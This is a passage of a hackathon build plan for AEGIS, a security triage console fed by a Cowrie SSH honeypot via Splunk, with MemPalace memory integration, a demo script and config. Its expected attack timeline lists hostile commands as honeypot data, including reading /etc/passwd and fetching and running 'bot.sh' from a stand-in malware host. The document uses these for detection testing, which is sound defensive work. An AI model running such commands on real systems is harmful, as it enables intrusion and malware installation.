| 1 | `cowrie.session.connect` from 185.220.101.45 | T+0s | T1046 |
| 2–13 | 12× `cowrie.login.failed` (root/admin/test/etc.) | T+1s to T+60s | T1110 |
| 14 | `cowrie.login.success` (root/root) | T+65s | T1078 |
| 15 | `cowrie.command.input` → `whoami` | T+70s | T1059 |
| 16 | `cowrie.command.input` → `cat /etc/passwd` | T+75s | T1059 |
| 17 | `cowrie.command.input` → `wget http://mal.example/bot.sh` | T+80s | T1059, T1105 |
| 18 | `cowrie.session.file_download` → `bot.sh` | T+82s | T1105 |
| 19 | `cowrie.command.input` → `chmod +x /tmp/bot.sh` | T+85s | T1059 |
| 20 | `cowrie.command.input` → `/tmp/bot.sh` | T+88s | T1059 |

Expected AEGIS outcome:
- **1 incident**, type `account_compromise`
- Severity: **Critical** (score 80–92)
- 20 alerts correlated by `same_source_ip` + `same_user` (root) + `same_host` (cowrie session) + `attack_chain_match`

### 7.3 Background Noise

Add 3–5 unrelated low-value events to make correlation more impressive:
- Random SSH connect from a different IP, no login
- Failed login for a different username from a different IP
- A benign port scan event (if IDS mock data is loaded)

---

## Phase 9 — MemPalace AI Memory Integration (2–3 hours)

> **What it is:** MemPalace is a local, free AI memory system that stores every conversation and decision verbatim in ChromaDB and makes it semantically searchable. It scored 96.6% on the LongMemEval benchmark — the highest published score requiring zero API keys or cloud calls. AEGIS uses it to give the AI a persistent, growing memory of attacker behavior and analyst decisions across all sessions.

### 9.1 Install MemPalace on EC2 #3

```bash
pip install mempalace

# Initialize the palace for AEGIS
mempalace init ~/.mempalace/aegis/
```

This sets up the wing/room/closet/drawer hierarchy inside `~/.mempalace/aegis/`.

### 9.2 Wing Design for AEGIS

MemPalace organizes memory into **Wings** → **Halls** → **Rooms** → **Closets** → **Drawers**. For AEGIS, we use this structure:

| Wing | Type | What it stores |
|------|------|----------------|
| `wing_attackers` | project | Per-IP attacker profiles, TTPs, session histories |
| `wing_incidents` | project | All closed incidents — RCA bundles, analyst notes, AI summaries |
| `wing_soc_analyst` | person | Analyst decisions, status updates, false-positive flags |
| `wing_rules` | project | Correlation rule tuning decisions, severity weight changes |
| `wing_agents` | project | Specialist agent diaries (reviewer, triage, threat-intel) |

Hall types used across all wings:
- `hall_facts` — confirmed attacker TTPs, finalized incident decisions
- `hall_events` — raw session timelines, what happened when
- `hall_discoveries` — new attacker patterns, new IOCs found
- `hall_preferences` — analyst workflow preferences, false-positive patterns
- `hall_advice` — recommended actions, past mitigations

### 9.3 Attacker Knowledge Graph

MemPalace's built-in **temporal knowledge graph** (SQLite-backed, like Zep/Graphiti but local and free) tracks attacker entities over time:

```python
from mempalace.knowledge_graph import KnowledgeGraph

kg = KnowledgeGraph(palace_path="~/.mempalace/aegis/")

# When a new incident is created
kg.add_triple("185.220.101.45", "used_technique", "T1110_brute_force",
              valid_from="2026-04-09T04:12:00Z")
kg.add_triple("185.220.101.45", "targeted_host", "svr04",
              valid_from="2026-04-09T04:12:00Z")
kg.add_triple("185.220.101.45", "downloaded_file", "bot.sh_sha:e3b0c4",
              valid_from="2026-04-09T04:15:22Z")

# Query: has this IP attacked us before?
kg.query_entity("185.220.101.45")
# → [used_technique: T1110 (Apr 9), targeted_host: svr04 (Apr 9), ...]

# Cross-incident timeline for an IP
kg.timeline("185.220.101.45")
# → chronological story of everything this IP has done across all sessions
```

This knowledge graph is queried by the **RCA service** before building the incident bundle — so if the same IP attacked yesterday, that context flows into the AI summary automatically.

### 9.4 Integration into `rca_service.py`

Add a MemPalace enrichment step before the LLM call:

```python
# In services/rca_service.py
from mempalace.searcher import search_memories
from mempalace.knowledge_graph import KnowledgeGraph

async def build_rca_bundle(incident: Incident) -> dict:
    kg = KnowledgeGraph(palace_path=settings.MEMPALACE_PALACE_PATH)

    # 1. Pull prior knowledge about the attacker IP
    src_ip = incident.primary_src_ip
    prior_kg = kg.query_entity(src_ip)        # temporal triples
    prior_memory = search_memories(
        f"attacker {src_ip}",
        palace_path=settings.MEMPALACE_PALACE_PATH,
        wing="wing_attackers"
    )                                          # verbatim past summaries

    # 2. Pull similar past incidents
    similar = search_memories(
        f"{incident.classification} {incident.primary_technique}",
        palace_path=settings.MEMPALACE_PALACE_PATH,
        wing="wing_incidents"
    )

    # 3. Inject into RCA bundle
    bundle = {
        "incident": incident.dict(),
        "entities": [...],
        "timeline": [...],
        "mitre_techniques": [...],
        "attacker_history": prior_kg,          # ← NEW: from KG
        "prior_incidents_memory": similar,     # ← NEW: from MemPalace
        "prior_memory_verbatim": prior_memory, # ← NEW: raw past summaries
    }
    return bundle
```

### 9.5 Auto-Save Incidents to MemPalace

After an incident is closed or a summary is generated, write it to the palace:

```python
# In services/summary_service.py — after saving to PostgreSQL
from mempalace.miner import mine_text

async def save_incident_to_palace(incident: Incident, summary: str):
    # Save the full AI summary to wing_incidents
    await mine_text(
        text=summary,
        palace_path=settings.MEMPALACE_PALACE_PATH,
        wing="wing_incidents",
        hall="hall_facts",
        room=incident.classification,          # e.g., "account_compromise"
        metadata={"incident_id": incident.id, "src_ip": incident.primary_src_ip}
    )

    # Update the knowledge graph with confirmed TTPs
    kg = KnowledgeGraph(palace_path=settings.MEMPALACE_PALACE_PATH)
    for technique in incident.mitre_techniques:
        kg.add_triple(
            incident.primary_src_ip,
            "used_technique",
            technique,
            valid_from=incident.first_seen_at.isoformat()
        )
```

### 9.6 Specialist SOC Agents

MemPalace supports **specialist agents** with their own wings and AAAK-compressed diaries. Add three agents to AEGIS:

```
~/.mempalace/aegis/agents/
├── reviewer.json        # Spots FP patterns — "this IP is CDN, not attacker"
├── triage.json          # Prioritizes incidents — "brute-force without success = low"
└── threat_intel.json    # Cross-references IOCs across all sessions
```

Each agent is called via the **MCP server** — the AI can invoke `mempalace_diary_write` and `mempalace_diary_read` directly from within the summarization prompt, making agents session-persistent across hackathon restarts.

### 9.7 MCP Server Setup for Claude/GPT Integration

```bash
# Start the MemPalace MCP server alongside the AEGIS backend
python -m mempalace.mcp_server --palace ~/.mempalace/aegis/ &
```

In the AI summarization prompt, give the model access to 19 palace tools:
- `mempalace_search` — find prior incidents, analyzer notes, recommendations
- `mempalace_kg_query` — query the attacker knowledge graph
- `mempalace_kg_timeline` — show full attacker history
- `mempalace_diary_read` — read specialist agent memory
- `mempalace_diary_write` — save agent findings back to palace

### 9.8 Wake-Up Context Layer

Before every AI summary generation, inject the MemPalace **L0 + L1 context** (~170 tokens) into the system prompt:

```bash
mempalace wake-up --wing wing_attackers > /tmp/aegis_context.txt
```

```python
# In summary_service.py
with open("/tmp/aegis_context.txt") as f:
    context_layer = f.read()

system_prompt = f"""
You are a SOC investigation summarization assistant.

## AEGIS Memory Context (MemPalace L0+L1)
{context_layer}

Use the above context to reference prior attacker behavior when relevant.
If an attacker IP has been seen before, say so explicitly.
"""
```

### 9.9 New Files for MemPalace

```
backed/app/services/
└── memory_service.py       ← NEW: wraps MemPalace read/write ops

scripts/
└── mempalace_init.sh       ← NEW: one-shot palace bootstrap

.env (additions):
  MEMPALACE_PALACE_PATH=~/.mempalace/aegis/
  MEMPALACE_ENABLED=true
```

---

## Phase 8 — Integration Testing & Demo Rehearsal (2 hours)

### 8.1 Pipeline Smoke Test

```bash
# 1. Start infrastructure
docker compose up -d

# 2. Run migrations
cd backend && alembic upgrade head

# 3. Start backend
uvicorn app.main:app --reload --host 0.0.0.0 --port 8000

# 4. Start workers
python -m app.workers.normalize_worker &
python -m app.workers.correlate_worker &
python -m app.workers.summary_worker &

# 5. Start frontend
cd frontend && npm run dev -- --host 0.0.0.0 --port 5173

# 6. Start Splunk bridge
python scripts/splunk_bridge.py &

# 7. Run attack simulator
python scripts/attack_simulator.py --target <COWRIE_IP> --port 2222

# 8. Open AEGIS dashboard and watch events flow in
```

### 8.2 Verify Checklist

- [ ] Cowrie EC2 is receiving SSH connections on port 2222
- [ ] Events appear in Splunk index `cowrie` within 30 seconds
- [ ] Splunk bridge script polls and forwards events to AEGIS
- [ ] AEGIS normalizes Cowrie events with correct MITRE mappings
- [ ] Correlation groups attacker session events into 1 incident
- [ ] Severity score lands in 80–92 range for full attack chain
- [ ] AI summary generates successfully
- [ ] Dashboard shows live updates
- [ ] Incident detail page shows full timeline with Cowrie events
- [ ] Mock scenarios still work independently as fallback

### 8.3 Demo Rehearsal Script

| Step | Time | Action | What to Say |
|------|------|--------|-------------|
| 1 | 0:00 | Show dashboard | "AEGIS is a cybersecurity triage console that transforms fragmented alerts into explainable incidents." |
| 2 | 0:30 | Point to architecture | "We have a real Cowrie SSH honeypot running on AWS, being attacked by real internet bots. Those logs flow through Splunk SIEM into AEGIS." |
| 3 | 1:00 | Show Splunk briefly | "Here's Splunk receiving live Cowrie events — brute force attempts, logins, commands." |
| 4 | 1:30 | Run attack simulator (or show existing live data) | "Let me trigger a controlled attack against our honeypot to show the full pipeline." |
| 5 | 2:00 | Watch dashboard update | "Watch as raw alerts flow in — failed logins, successful login, command execution, malware download." |
| 6 | 2:30 | Open the new incident | "AEGIS collapsed 20 raw alerts from this attack into one Critical incident." |
| 7 | 3:00 | Show correlation panel | "This is fully deterministic and auditable. Same user, same IP, attack chain progression. No black box." |
| 8 | 3:30 | Show severity breakdown | "Severity 85 — base brute-force score plus bonuses for command execution, file download, and attack chain match." |
| 9 | 4:00 | Show AI summary | "The AI layer only summarizes after deterministic detection. It received a structured bundle, not raw logs. And we validate its output for hallucinations." |
| 10 | 4:30 | Show recommended actions | "The analyst now knows: block this IP, review downloaded files, check if this IP hit other systems." |
| 11 | 5:00 | Close with impact | "AEGIS reduces first-pass triage from hours to seconds. With real Splunk integration proven today, the path to production is clear." |

---

## Full Timeline Summary (24-Hour Hackathon)

| Hours | Phase | Deliverable |
|-------|-------|-------------|
| 0–1 | Lock spec + contracts | Frozen schemas, API contracts, repo created |
| 1–3 | AWS + Cowrie + Splunk | 3 EC2s running, Cowrie logging to Splunk |
| 3–5 | Backend skeleton | FastAPI + DB models + migrations + Docker Compose |
| 5–7 | Ingest + Normalization | Adapters (SIEM, EDR, IDS, Cowrie), worker pipeline |
| 7–10 | Correlation + Scoring | Correlation engine, severity, classification working |
| 10–12 | Splunk Bridge + Simulator | Live Cowrie → Splunk → AEGIS pipeline proven |
| 12–16 | Frontend MVP | Dashboard, incidents list, incident detail, charts |
| 16–18 | AI Summary | OpenAI GPT-4.5 integration, validation, fallback templates |
| 18–19 | **MemPalace Setup** | Palace init, KG wiring, MCP server, wake-up context layer |
| 19–20 | **MemPalace Demo** | AI summary shows prior attacker history, specialist agents active |
| 20–21 | Polish + Tuning | Scenario timing, severity weights, UI polish |
| 21–23 | Integration Testing | Full pipeline end-to-end, live demo rehearsal |
| 23–24 | Final prep | Fix bugs, rehearse demo 3×, prepare talking points |

### Hard Prioritization (if behind schedule)

Ship in this order — cut from the bottom:

1. ✅ Cowrie + Splunk pipeline working
2. ✅ Ingest + normalize (Cowrie adapter)
3. ✅ Correlation + severity + classification
4. ✅ Incident list + detail page
5. ✅ Dashboard with KPI cards
6. ✅ AI summary with OpenAI GPT-4.5
7. ✅ **MemPalace KG** — attacker IP triples, enriched RCA bundle
8. ⚠️ **MemPalace wake-up context** — 170-token L0/L1 layer in system prompt
9. ⚠️ **MemPalace specialist agents** — reviewer, triage, threat-intel diaries
10. ⚠️ OpenSearch (skip if needed, use PostgreSQL)
11. ⚠️ Extra charts/animations
12. ⚠️ Scenario runner UI page (use API directly)

---

## Environment Variables (`.env.example`)

```env
# App
APP_NAME=AEGIS
APP_ENV=development
LOG_LEVEL=INFO
API_PORT=8000
FRONTEND_URL=http://localhost:5173

# PostgreSQL
POSTGRES_HOST=localhost
POSTGRES_PORT=5432
POSTGRES_DB=aegis
POSTGRES_USER=aegis
POSTGRES_PASSWORD=aegis
DATABASE_URL=postgresql+psycopg://aegis:aegis@localhost:5432/aegis

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_URL=redis://localhost:6379/0

# OpenSearch
OPENSEARCH_ENABLED=true
OPENSEARCH_HOST=http://localhost:9200
OPENSEARCH_ALERT_INDEX=alerts-v1

# OpenAI
OPENAI_API_KEY=replace_me
OPENAI_BASE_URL=https://api.openai.com/v1
OPENAI_MODEL=gpt-5.4
SUMMARY_GENERATION_ENABLED=true

# Splunk Bridge
SPLUNK_HOST=https://<SPLUNK_PRIVATE_IP>:8089
SPLUNK_USER=admin
SPLUNK_PASS=YourSplunkPass123!
SPLUNK_INDEX=cowrie
SPLUNK_POLL_INTERVAL=30
AEGIS_API_URL=http://localhost:8000

# Correlation
CORRELATION_LOOKBACK_MINUTES=30
CORRELATION_ATTACH_THRESHOLD=30

# Summary
SUMMARY_MIN_ALERT_COUNT=2
SUMMARY_MIN_SEVERITY_SCORE=40

# MemPalace (NEW)
MEMPALACE_ENABLED=true
MEMPALACE_PALACE_PATH=~/.mempalace/aegis/
MEMPALACE_MCP_PORT=6333
MEMPALACE_WAKE_UP_WING=wing_attackers
```

---

## Risk Mitigation

| Risk | Mitigation |
|------|------------|
| No real attackers within hackathon window | Attack simulator script gives instant, deterministic demo data |
| Splunk setup fails | Cowrie JSON logs can be tailed directly by a file-reader bridge script (skip Splunk) |
| OpenSearch complex to set up | Serve all queries from PostgreSQL with indexed columns |
| OpenAI API down/no key | Deterministic fallback summary templates |
| Workers crash | Execute normalize/correlate synchronously in ingest endpoint |
| Frontend takes too long | Prioritize 3 pages only (dashboard, list, detail) |
| Cowrie generates too much noise | Filter bridge to only forward `cowrie.login.*`, `cowrie.command.*`, `cowrie.session.file_*` events |

---

## Team Split (4 members)

| Member | Responsibility | Key Deliverables |
|--------|---------------|-----------------|
| **Member 1: Backend/API** | FastAPI, DB models, all API routes | App boots, `/docs` works, ingest + incidents routes |
| **Member 2: Detection Logic** | Adapters (including Cowrie), correlation, severity, classification | Correct incident from attack_simulator, explanation payload |
| **Member 3: Frontend/UI** | React pages, charts, timeline, severity visuals | Polished demo flow, all 3 main pages |
| **Member 4: Infra/AI/Memory** | AWS setup, Cowrie, Splunk, bridge script, OpenAI GPT-4.5, **MemPalace integration**, demo narrative | Live pipeline + persistent memory working, AI summaries reference prior attacker history, rehearsed demo |

### Member 4: MemPalace Checklist
- [ ] `pip install mempalace` on EC2 #3; run `mempalace init ~/.mempalace/aegis/`
- [ ] Design wing structure (`wing_attackers`, `wing_incidents`, `wing_soc_analyst`)
- [ ] Wire `memory_service.py` into `rca_service.py` — KG query before LLM call
- [ ] Wire `memory_service.py` into `summary_service.py` — save incident after generation
- [ ] Start MCP server alongside backend; verify 19 tools available
- [ ] Add `mempalace wake-up` output to AI system prompt
- [ ] Create 3 specialist agents (reviewer, triage, threat_intel)
- [ ] Demo talking point: run attack twice — second time the AI *remembers* the IP
